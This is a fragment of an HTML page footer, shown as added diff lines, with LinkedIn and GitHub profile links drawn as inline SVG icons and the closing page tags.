+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</body>
+</html>
